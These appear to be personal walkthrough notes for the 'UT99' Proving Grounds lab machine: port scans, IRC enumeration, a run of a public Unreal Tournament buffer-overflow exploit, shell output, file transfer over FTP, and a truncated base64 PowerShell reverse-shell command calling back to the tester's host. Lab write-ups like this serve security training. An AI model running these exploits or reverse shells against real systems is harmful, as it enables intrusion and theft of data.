![](Pasted%20image%2020220205190441.png)

![](Pasted%20image%2020220205195433.png)
## 443 - HTTPS

![](Pasted%20image%2020220205190216.png)

## 3306 - MySQL

```
# Nmap 7.91 scan initiated Fri Jan 21 07:57:11 2022 as: nmap -vv --reason -Pn -T4 -sV -p 3306 "--script=banner,(mysql* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/UT99/results/192.168.196.44/scans/tcp3306/tcp_3306_mysql_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/UT99/results/192.168.196.44/scans/tcp3306/xml/tcp_3306_mysql_nmap.xml" 192.168.196.44
Nmap scan report for 192.168.196.44
Host is up, received user-set (0.25s latency).
Scanned at 2022-01-21 07:57:13 EST for 11s

PORT     STATE SERVICE REASON          VERSION
3306/tcp open  mysql   syn-ack ttl 127 MySQL (unauthorized)
| banner: G\x00\x00\x00\xFFj\x04Host '192.168.49.196' is not allowed to c
|_onnect to this MySQL server
|_mysql-empty-password: Host '192.168.49.196' is not allowed to connect to this MySQL server
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 21 07:57:24 2022 -- 1 IP address (1 host up) scanned in 13.04 seconds
```

## 6660 > - IRC

Important Scans
```
6753/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 2
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6754/tcp open  irc        syn-ack ttl 127 InspIRCd
6755/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 4
|   servers: 1
|   chans: 1
|   lusers: 4
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6756/tcp open  irc        syn-ack ttl 127 InspIRCd

6817/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 3
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6818/tcp open  irc        syn-ack ttl 127 InspIRCd

6824/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 4
|   servers: 1
|   chans: 1
|   lusers: 4
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6825/tcp open  irc        syn-ack ttl 127 InspIRCd
6826/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 3
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6827/tcp open  irc        syn-ack ttl 127 InspIRCd

6856/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 2
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6857/tcp open  irc        syn-ack ttl 127 InspIRCd
6858/tcp open  irc        syn-ack ttl 127 InspIRCd
6859/tcp open  irc        syn-ack ttl 127 InspIRCd
6860/tcp open  irc        syn-ack ttl 127 InspIRCd
6861/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 4
|   servers: 1
|   chans: 1
|   lusers: 4
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6862/tcp open  irc        syn-ack ttl 127 InspIRCd

6874/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 3
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6875/tcp open  irc        syn-ack ttl 127 InspIRCd

6947/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 2
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6948/tcp open  irc        syn-ack ttl 127 InspIRCd
```


### Connection

```
┌──(kali㉿kali)-[/tmp]
└─$ nc 192.168.208.44 6753
:irc.madcowz.localdomain NOTICE Auth :*** Looking up your hostname...
USER ran213eqdw123 0 * ran213eqdw123
NICK ran213eqdw123
:irc.madcowz.localdomain NOTICE Auth :*** Could not resolve your hostname: Request timed out; using your IP address (192.168.49.208) instead.
:irc.madcowz.localdomain NOTICE Auth :Welcome to MadCowz!
:irc.madcowz.localdomain 001 ran213eqdw123 :Welcome to the MadCowz IRC Network ran213eqdw123!ran213eqdw1@192.168.49.208
:irc.madcowz.localdomain 002 ran213eqdw123 :Your host is irc.madcowz.localdomain, running version 2.0
:irc.madcowz.localdomain 003 ran213eqdw123 :This server was created 10:20:51 May 10 2015
:irc.madcowz.localdomain 004 ran213eqdw123 irc.madcowz.localdomain 2.0 iosw biklmnopstv bklov
:irc.madcowz.localdomain 005 ran213eqdw123 AWAYLEN=200 CASEMAPPING=rfc1459 CHANMODES=b,k,l,imnpst CHANNELLEN=64 CHANTYPES=# CHARSET=ascii ELIST=MU FNC KICKLEN=255 MAP MAXBANS=60 MAXCHANNELS=20 MAXPARA=32 :are supported by this server
:irc.madcowz.localdomain 005 ran213eqdw123 MAXTARGETS=20 MODES=20 NETWORK=MadCowz NICKLEN=31 PREFIX=(ov)@+ STATUSMSG=@+ TOPICLEN=307 VBANLIST WALLCHOPS WALLVOICES :are supported by this server
:irc.madcowz.localdomain 042 ran213eqdw123 909AAAAAE :your unique ID
:irc.madcowz.localdomain 375 ran213eqdw123 :irc.madcowz.localdomain message of the day
:irc.madcowz.localdomain 372 ran213eqdw123 :- Mad Cowz, y0!
:irc.madcowz.localdomain 376 ran213eqdw123 :End of message of the day.
:irc.madcowz.localdomain 251 ran213eqdw123 :There are 2 users and 0 invisible on 1 servers
:irc.madcowz.localdomain 254 ran213eqdw123 1 :channels formed
:irc.madcowz.localdomain 255 ran213eqdw123 :I have 2 clients and 0 servers
:irc.madcowz.localdomain 265 ran213eqdw123 :Current Local Users: 2  Max: 2
:irc.madcowz.localdomain 266 ran213eqdw123 :Current Global Users: 2  Max: 2
VERSION
:irc.madcowz.localdomain 351 ran213eqdw123 :2.0 irc.madcowz.localdomain :
:irc.madcowz.localdomain 005 ran213eqdw123 AWAYLEN=200 CASEMAPPING=rfc1459 CHANMODES=b,k,l,imnpst CHANNELLEN=64 CHANTYPES=# CHARSET=ascii ELIST=MU FNC KICKLEN=255 MAP MAXBANS=60 MAXCHANNELS=20 MAXPARA=32 :are supported by this server
:irc.madcowz.localdomain 005 ran213eqdw123 MAXTARGETS=20 MODES=20 NETWORK=MadCowz NICKLEN=31 PREFIX=(ov)@+ STATUSMSG=@+ TOPICLEN=307 VBANLIST WALLCHOPS WALLVOICES :are supported by this server
HELP
:irc.madcowz.localdomain 421 ran213eqdw123 HELP :Unknown command
INFO
:irc.madcowz.localdomain 371 ran213eqdw123 :                   -/\- InspIRCd -\/-
:irc.madcowz.localdomain 371 ran213eqdw123 :                 November 2002 - Present
:irc.madcowz.localdomain 371 ran213eqdw123 : 
:irc.madcowz.localdomain 371 ran213eqdw123 :Core Developers:
:irc.madcowz.localdomain 371 ran213eqdw123 :    Craig Edwards,          Brain,      <brain@inspircd.org>
:irc.madcowz.localdomain 371 ran213eqdw123 :    Craig McLure,           Craig,      <craig@inspircd.org>
:irc.madcowz.localdomain 371 ran213eqdw123 :    Robin Burchell,         w00t,       <w00t@inspircd.org>
:irc.madcowz.localdomain 371 ran213eqdw123 :    Oliver Lupton,          Om,         <om@inspircd.org>
:irc.madcowz.localdomain 371 ran213eqdw123 :    John Brooks,            Special,    <special@inspircd.org>
:irc.madcowz.localdomain 371 ran213eqdw123 :    Dennis Friis,           peavey,     <peavey@inspircd.org>
:irc.madcowz.localdomain 371 ran213eqdw123 :    Thomas Stagner,         aquanight,  <aquanight@inspircd.org>
:irc.madcowz.localdomain 371 ran213eqdw123 :    Uli Schlachter,         psychon,    <psychon@inspircd.org>
:irc.madcowz.localdomain 371 ran213eqdw123 :    Matt Smith,             dz,         <dz@inspircd.org>
:irc.madcowz.localdomain 371 ran213eqdw123 :    Daniel De Graaf,        danieldg,   <danieldg@inspircd.org>
:irc.madcowz.localdomain 371 ran213eqdw123 :                            jackmcbarn, <jackmcbarn@inspircd.org>
:irc.madcowz.localdomain 371 ran213eqdw123 :    Attila Molnar,          Attila,     <attilamolnar@hush.com>
:irc.madcowz.localdomain 371 ran213eqdw123 : 
:irc.madcowz.localdomain 371 ran213eqdw123 :Regular Contributors:
:irc.madcowz.localdomain 371 ran213eqdw123 :    Adam           SaberUK
:irc.madcowz.localdomain 371 ran213eqdw123 : 
:irc.madcowz.localdomain 371 ran213eqdw123 :Other Contributors:
:irc.madcowz.localdomain 371 ran213eqdw123 :    ChrisTX        Shawn           Shutter
:irc.madcowz.localdomain 371 ran213eqdw123 : 
:irc.madcowz.localdomain 371 ran213eqdw123 :Former Contributors:
:irc.madcowz.localdomain 371 ran213eqdw123 :   dmb             Zaba            skenmy         GreenReaper
:irc.madcowz.localdomain 371 ran213eqdw123 :   Dan             Jason           satmd          owine
:irc.madcowz.localdomain 371 ran213eqdw123 :   Adremelech      John2           jilles         HiroP
:irc.madcowz.localdomain 371 ran213eqdw123 :   eggy            Bricker         AnMaster       djGrrr
:irc.madcowz.localdomain 371 ran213eqdw123 :   nenolod         Quension        praetorian     pippijn
:irc.madcowz.localdomain 371 ran213eqdw123 :   CC              jamie           typobox43      Burlex (win32)
:irc.madcowz.localdomain 371 ran213eqdw123 :   Stskeeps        ThaPrince       BuildSmart     Thunderhacker
:irc.madcowz.localdomain 371 ran213eqdw123 :   Skip            LeaChim         Majic          MacGyver
:irc.madcowz.localdomain 371 ran213eqdw123 :   Namegduf        Ankit           Phoenix        Taros
:irc.madcowz.localdomain 371 ran213eqdw123 : 
:irc.madcowz.localdomain 371 ran213eqdw123 :Thanks To:
:irc.madcowz.localdomain 371 ran213eqdw123 :   searchirc.com   irc-junkie.org  Brik           fraggeln
:irc.madcowz.localdomain 371 ran213eqdw123 : 
:irc.madcowz.localdomain 371 ran213eqdw123 : Best experienced with: An IRC client
:irc.madcowz.localdomain 374 ran213eqdw123 :End of /INFO list
LINKS
:irc.madcowz.localdomain 364 ran213eqdw123 irc.madcowz.localdomain irc.madcowz.localdomain :0 Mad Cowz IRC
:irc.madcowz.localdomain 365 ran213eqdw123 * :End of /LINKS list.
HELPOP USERCMDS
:irc.madcowz.localdomain 421 ran213eqdw123 HELPOP :Unknown command
OPERATOR CAPA
:irc.madcowz.localdomain 421 ran213eqdw123 OPERATOR :Unknown command
ADMIN
:irc.madcowz.localdomain 256 ran213eqdw123 :Administrative info for irc.madcowz.localdomain
:irc.madcowz.localdomain 257 ran213eqdw123 :Name     - Fluffy Cow
:irc.madcowz.localdomain 258 ran213eqdw123 :Nickname - Fluffy
:irc.madcowz.localdomain 259 ran213eqdw123 :E-Mail   - fluffycow@localdomain
USERS
:irc.madcowz.localdomain 421 ran213eqdw123 USERS :Unknown command
TIME
:irc.madcowz.localdomain 391 ran213eqdw123 irc.madcowz.localdomain :Sat Feb 05 03:15:48 2022
STATS a
:irc.madcowz.localdomain 481 ran213eqdw123 :Permission denied - STATS a requires the servers/auspex priv.
NAMES
:irc.madcowz.localdomain 366 ran213eqdw123 * :End of /NAMES list.
LIST
:irc.madcowz.localdomain 321 ran213eqdw123 Channel :Users Name
:irc.madcowz.localdomain 322 ran213eqdw123 #ut99 1 :[+nt] Fragging since UT99!  Unreal Tournament 99 Game Server UP!  IP: *THIS*  Port: 7778
:irc.madcowz.localdomain 323 ran213eqdw123 :End of channel list.
WHOIS fluffycow
:irc.madcowz.localdomain 401 ran213eqdw123 fluffycow :No such nick/channel
:irc.madcowz.localdomain 318 ran213eqdw123 fluffycow :End of /WHOIS list.
WHOIS Fluffy
:irc.madcowz.localdomain 401 ran213eqdw123 Fluffy :No such nick/channel
:irc.madcowz.localdomain 318 ran213eqdw123 Fluffy :End of /WHOIS list.
WHOIS #ut99
:irc.madcowz.localdomain 401 ran213eqdw123 #ut99 :No such nick/channel
:irc.madcowz.localdomain 318 ran213eqdw123 #ut99 :End of /WHOIS list.
WHOIS #ut99 1
:irc.madcowz.localdomain 401 ran213eqdw123 1 :No such nick/channel
:irc.madcowz.localdomain 318 ran213eqdw123 1 :End of /WHOIS list.
OPER
:irc.madcowz.localdomain 461 ran213eqdw123 OPER :Not enough parameters.
JOIN 1
:irc.madcowz.localdomain 403 ran213eqdw123 1 :Invalid channel name
JOIN #ut99
:ran213eqdw123!ran213eqdw1@192.168.49.208 JOIN :#ut99
:irc.madcowz.localdomain 332 ran213eqdw123 #ut99 :Fragging since UT99!  Unreal Tournament 99 Game Server UP!  IP: *THIS*  Port: 7778
:irc.madcowz.localdomain 333 ran213eqdw123 #ut99 daisy!daisy@0::1 1597262723
:irc.madcowz.localdomain 353 ran213eqdw123 = #ut99 :@daisy ran213eqdw123 
:irc.madcowz.localdomain 366 ran213eqdw123 #ut99 :End of /NAMES list.


```

![](Pasted%20image%2020220205192653.png)

USER Fluffy 0 * Fluffy
NICK Fluffy

USER daisy 0 * daisy
NICK daisy

### User enum

![](Pasted%20image%2020220205195147.png)

![](Pasted%20image%2020220205195354.png)

```
┌──(kali㉿kali)-[/tmp]
└─$ nc 192.168.208.44 6753
:irc.madcowz.localdomain NOTICE Auth :*** Looking up your hostname...
USER daisy 0 * daisy
:irc.madcowz.localdomain NOTICE Auth :*** Could not resolve your hostname: Request timed out; using your IP address (192.168.49.208) instead.
NICK daisy
:irc.madcowz.localdomain 433 * daisy :Nickname is already in use.
ERROR :Closing link: (daisy@192.168.49.208) [Registration timeout]
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

## UDP 7778 - UT99 Game Server

Guessed from IRC chat port 7778, so either TCP port or UDP port

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo nmap -sU -p 7778 192.168.121.44                       
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-05 09:22 EST
Nmap scan report for 192.168.121.44
Host is up (0.18s latency).

PORT     STATE         SERVICE
7778/udp open|filtered interwise

Nmap done: 1 IP address (1 host up) scanned in 2.18 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

# Exploitation

UT99 Exploit
https://www.google.com/search?q=unreal+tournament+99+game+server+exploit&rlz=1C1ONGR_enSG945SG945&sxsrf=APq-WBvuBmFwZI297IDm7lrN7Lro1B0G9Q%3A1644071214627&ei=Lon-Ya3VJfup4t4Pupaj-AY&oq=Unreal+tournament+99+game+server+&gs_lcp=Cgdnd3Mtd2l6EAEYADIFCAAQgAQyBggAEBYQHjoHCAAQRxCwA0oECEEYAEoECEYYAFDHA1jHA2DoCWgBcAJ4AIABPIgBPJIBATGYAQCgAQHIAQfAAQE&sclient=gws-wiz

Have to reset the box to find the right port

```
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 16145    
  Exploit: Unreal Tournament - Remote Buffer Overflow (SEH)
      URL: https://www.exploit-db.com/exploits/16145
     Path: /usr/share/exploitdb/exploits/windows/remote/16145.pl
File Type: ASCII text

Copied to: /tmp/16145.pl


                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ perl 16145.pl                 
Usage: unreal_tournament-bof-win.pl <host> <query port> <reverse ip> <reverse port>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ perl 16145.pl 192.168.121.44 7778 192.168.49.121 443                                                                                                          255 ⨯
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ perl 16145.pl 192.168.121.44 7001 192.168.49.121 443
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ perl 16145.pl 192.168.121.44 7778 192.168.49.121 443                                                                                                          130 ⨯
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ perl 16145.pl 192.168.121.44 7778 192.168.49.121 443                                                                                                          130 ⨯
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ perl 16145.pl 192.168.121.44 7778 192.168.49.121 80                                                                                                           130 ⨯
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
listening on [any] 80 ...
connect to [192.168.49.121] from (UNKNOWN) [192.168.121.44] 49218
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\UnrealTournament\System>cd \Users
cd \Users

C:\Users>dir
dir
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of C:\Users

09/30/2015  10:19 PM    <DIR>          .
09/30/2015  10:19 PM    <DIR>          ..
07/26/2021  05:48 AM    <DIR>          daisy
11/12/2015  04:39 AM    <DIR>          fluffy
10/07/2015  03:05 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  13,058,252,800 bytes free

C:\Users>cd daisy
cd daisy

C:\Users\daisy>cd Desktop
cd Desktop

C:\Users\daisy\Desktop>dir
dir
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of C:\Users\daisy\Desktop

12/22/2020  04:14 AM    <DIR>          .
12/22/2020  04:14 AM    <DIR>          ..
10/03/2015  01:17 AM               762 HexChat (x64).lnk
10/03/2015  01:24 AM               846 inspircd.lnk
10/03/2015  02:03 AM               108 irc.txt
02/05/2022  06:40 AM                34 local.txt
09/30/2015  10:01 PM               838 Mumble.lnk
10/06/2015  09:16 AM             2,347 Murmur.lnk
10/06/2015  09:14 AM             1,622 Start UT Server (Looped).lnk
09/30/2015  09:59 PM               586 XAMPP Control Panel.lnk
10/07/2015  03:44 AM            55,004 xampp.pdf
               9 File(s)         62,147 bytes
               2 Dir(s)  13,058,281,472 bytes free

C:\Users\daisy\Desktop>type local.txt
type local.txt
ef1bbf4575796ea227f274b1b60721f2

C:\Users\daisy\Desktop>ifconfig
ifconfig
'ifconfig' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\daisy\Desktop>type local.txt
type local.txt
pef1bbf4575796ea227f274b1b60721f2

C:\Users\daisy\Desktop>type local.txt
ptype local.txt
'ptype' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\daisy\Desktop>type local.txt
type local.txt
ef1bbf4575796ea227f274b1b60721f2

C:\Users\daisy\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.121.44
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.121.254

Tunnel adapter Local Area Connection* 6:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 7:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Users\daisy\Desktop>cd \
cd \

C:\>dir
dir
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of C:\

10/07/2015  05:21 AM    <DIR>          ftp
01/20/2008  07:03 PM    <DIR>          PerfLogs
10/03/2015  01:17 AM    <DIR>          Program Files
10/07/2015  03:04 AM    <DIR>          Program Files (x86)
10/07/2015  02:54 AM    <DIR>          Python
09/30/2015  09:41 PM    <DIR>          UnrealTournament
09/30/2015  10:19 PM    <DIR>          Users
12/09/2015  06:49 PM    <DIR>          Windows
09/30/2015  10:11 PM    <DIR>          xampp
               0 File(s)              0 bytes
               9 Dir(s)  13,058,260,992 bytes free

C:\>cd ftp
cd ftp

C:\ftp>dir
dir
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of C:\ftp

10/07/2015  05:21 AM    <DIR>          .
10/07/2015  05:21 AM    <DIR>          ..
10/07/2015  12:44 PM        35,984,520 FoxitReader706.1126_enu_Setup.exe
10/07/2015  03:46 AM        35,922,892 KB968930.msu
10/07/2015  12:45 PM       114,238,280 xampp-win32-5.6.12-0-VC11-installer.exe
               3 File(s)    186,145,692 bytes
               2 Dir(s)  13,058,260,992 bytes free

C:\ftp>

```

![](Pasted%20image%2020220205224229.png)

# Privesc

## Files

```
C:\Users\daisy>dir
dir
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of C:\Users\daisy

07/26/2021  05:48 AM    <DIR>          .
07/26/2021  05:48 AM    <DIR>          ..
09/30/2015  10:19 PM    <DIR>          Contacts
12/22/2020  04:14 AM    <DIR>          Desktop
10/07/2015  03:45 AM    <DIR>          Documents
10/07/2015  03:45 AM    <DIR>          Downloads
09/30/2015  10:20 PM    <DIR>          Favorites
09/30/2015  10:20 PM    <DIR>          Links
07/26/2021  05:48 AM            81,920 murmur.sqlite
09/30/2015  10:20 PM    <DIR>          Music
09/30/2015  10:20 PM    <DIR>          Pictures
09/30/2015  10:20 PM    <DIR>          Saved Games
09/30/2015  10:20 PM    <DIR>          Searches
09/30/2015  10:20 PM    <DIR>          Videos
               1 File(s)         81,920 bytes
              13 Dir(s)  13,059,424,256 bytes free

C:\Users\daisy>cd Desktop
cd Desktop

C:\Users\daisy\Desktop>dir
dir
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of C:\Users\daisy\Desktop

12/22/2020  04:14 AM    <DIR>          .
12/22/2020  04:14 AM    <DIR>          ..
10/03/2015  01:17 AM               762 HexChat (x64).lnk
10/03/2015  01:24 AM               846 inspircd.lnk
10/03/2015  02:03 AM               108 irc.txt
02/05/2022  06:40 AM                34 local.txt
09/30/2015  10:01 PM               838 Mumble.lnk
10/06/2015  09:16 AM             2,347 Murmur.lnk
10/06/2015  09:14 AM             1,622 Start UT Server (Looped).lnk
09/30/2015  09:59 PM               586 XAMPP Control Panel.lnk
10/07/2015  03:44 AM            55,004 xampp.pdf
               9 File(s)         62,147 bytes
               2 Dir(s)  13,059,424,256 bytes free

C:\Users\daisy\Desktop>cd ..
cd ..

C:\Users\daisy>copy murmur.sqlite \ftp
copy murmur.sqlite \ftp
        1 file(s) copied.

C:\Users\daisy>
```

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/UT99]
└─$ ftp 192.168.121.44 
Connected to 192.168.121.44.
220 MadCowz FTP!
Name (192.168.121.44:kali): guest
331 Password required for guest
Password:
230 Logged on
Remote system type is UNIX.
ftp> ls
200 Port command successful
150 Opening data channel for directory list.
-r-xr-xr-x 1 ftp ftp       35984520 Oct 07  2015 FoxitReader706.1126_enu_Setup.exe
-r--r--r-- 1 ftp ftp       35922892 Oct 07  2015 KB968930.msu
-r--r--r-- 1 ftp ftp          81920 Jul 26  2021 murmur.sqlite
-r-xr-xr-x 1 ftp ftp      114238280 Oct 07  2015 xampp-win32-5.6.12-0-VC11-installer.exe
226 Transfer OK
ftp> get murmur.sqlite
local: murmur.sqlite remote: murmur.sqlite
200 Port command successful
150 Opening data channel for file transfer.
WARNING! 90 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer OK
81920 bytes received in 2.14 secs (37.3662 kB/s)
ftp> binary
200 Type set to I
ftp> get murmur.sqlite
local: murmur.sqlite remote: murmur.sqlite
200 Port command successful
150 Opening data channel for file transfer.
226 Transfer OK
81920 bytes received in 1.24 secs (64.3630 kB/s)
ftp> exit
221 Goodbye
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/UT99]
└─$ file murmur.sqlite 
murmur.sqlite: SQLite 3.x database, last written using SQLite version 3007007
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/UT99]
└─$ 
```

![](Pasted%20image%2020220205225722.png)

## Powershell

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 80                                                                                                                                                1 ⨯
listening on [any] 80 ...
connect to [192.168.49.121] from (UNKNOWN) [192.168.121.44] 49232
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\UnrealTournament\System>powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMgAxACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMgAxACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAY